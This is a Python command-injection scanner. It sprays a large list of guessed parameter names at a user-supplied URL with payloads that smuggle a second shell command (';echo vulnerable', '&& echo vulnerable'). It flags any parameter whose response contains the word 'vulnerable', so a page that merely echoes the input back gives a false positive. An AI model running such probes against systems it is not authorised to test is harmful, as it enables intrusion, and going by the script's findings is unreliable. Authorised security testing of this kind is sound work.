
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore

def guess_params(params):
    if not params:
        common_params = [
    "cmd", "command", "exec", "run", "execute", "shell", "sh", "bash", "zsh", "powershell",
    "script", "scripts", "action", "process", "task", "operation", "jobs", "payload", "input",
    "output", "target", "dest", "destination", "source", "src", "path", "filepath", "dir", "directory",
    "folder", "file", "filename", "upload", "download", "log", "logfile", "read", "write", "open",
    "save", "load", "launch", "start", "stop", "kill", "terminate", "restart", "reboot", "init",
    "boot", "mount", "unmount", "ping", "check", "verify", "diagnose", "debug", "trace", "track",
    "monitor", "scan", "scan_path", "backup", "restore", "copy", "move", "sync", "rsync", "clone",
    "mirror", "update", "upgrade", "install", "uninstall", "patch", "configure", "setup", "config",
    "config_file", "cfg", "make", "build", "compile", "deploy", "provision", "host", "hostname",
    "server", "server_name", "domain", "fqdn", "ip", "ip_addr", "address", "hostip", "port", "gateway",
    "interface", "adapter", "mac", "network", "net", "ssid", "wifi", "ethernet", "dns", "resolve",
    "resolver", "lookup", "nslookup", "whois", "dig", "traceroute", "curl", "wget", "fetch", "get",
    "put", "post", "upload_file", "curl_url", "curl_cmd", "req", "request", "http", "url", "uri",
    "endpoint", "api", "api_call", "api_url", "api_endpoint", "token", "auth", "key", "apikey",
    "access", "username", "user", "password", "pass", "pwd", "cred", "credentials", "secret", "env",
    "env_var", "variable", "param", "arg", "argument", "flag", "option", "switch", "params", "args",
    "shell_cmd", "shell_command", "bash_cmd", "powershell_cmd", "ps_cmd", "win_cmd", "unix_cmd",
    "unix_exec", "win_exec", "win_shell", "unix_shell", "remote_cmd", "remote_exec", "remote",
    "remote_shell", "remote_script", "script_path", "script_exec", "admin_cmd", "syscmd", "system",
    "system_cmd", "system_command", "os_cmd", "os_command", "invoke", "trigger", "automation",
    "automate", "schedule", "cron", "crontab", "cronjob", "job", "pipeline", "step", "task_cmd",
    "run_job", "task_exec", "task_run", "build_cmd", "build_script", "build_tool", "build_job",
    "ci_cmd", "cd_cmd", "devops", "ops_cmd", "infra_cmd", "infra_script", "docker_cmd", "docker_run",
    "docker_exec", "dockerfile", "container", "container_cmd", "k8s_cmd", "kubectl_cmd", "ansible_cmd",
    "playbook_cmd", "chef_cmd", "puppet_cmd", "terraform_cmd", "shell_script", "ps_script", "bat_cmd",
    "cmd_path", "runas", "sudo_cmd", "sudo", "root_cmd", "admin", "admin_script", "priv_exec",
    "privileged", "elevated", "elevate_cmd", "user_input", "form_input", "terminal", "cli",
    "interactive", "stdin", "stdout", "stderr", "console", "console_input", "console_cmd", "raw_input",
    "eval", "systemctl", "service", "service_cmd", "daemon", "daemon_cmd", "restart_service",
    "kill_service", "init_script", "startup_script", "shutdown", "halt", "force", "force_exec",
    "overwrite", "override", "submit", "trigger_cmd", "launch_cmd", "interactive_cmd", "action_cmd",
    "job_exec", "cmdline", "cmd_exec", "commandline", "cmdstring", "injection", "command_injection",
    "runcmd", "execmd", "dos_cmd", "cmd_exec_param", "command_param", "bash_exec", "pipe_cmd",
    "pipe_input", "command_line", "command_field", "execution", "exec_param", "command_str",
    "executable", "run_command", "exec_input", "code", "code_exec", "os", "os_exec", "platform_cmd",
    "ssh_cmd", "ssh_exec", "remote_exec_cmd", "temp_exec", "upload_script", "temp_script",
    "malicious_input", "hacker_cmd", "reverse_shell", "payload_input", "rce_param", "shell_exec"
]

        params = {p: [''] for p in common_params}
    return params

def run():
    print("Running Command Injection scan with automatic parameter detection...")
    url = input("Enter target URL (with or without parameters): ").strip()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params = guess_params(params)

    payloads = [";echo vulnerable", "&& echo vulnerable"]
    vulnerable_params = []

    for param in params:
        vulnerable = False
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            try:
                res = requests.get(test_url, timeout=5)
                if "vulnerable" in res.text.lower():
                    print(Fore.RED + f"[!] Command Injection vulnerability detected in parameter: {param} with payload: {payload}")
                    vulnerable = True
                    vulnerable_params.append(param)
                    break
            except Exception as e:
                print(Fore.RED + f"[ERROR] {e}")
        if not vulnerable:
            print(Fore.YELLOW + f"[ ] No Command Injection detected in parameter: {param}")

    if not vulnerable_params:
        print(Fore.YELLOW + "[!] No vulnerable parameters detected for Command Injection.")
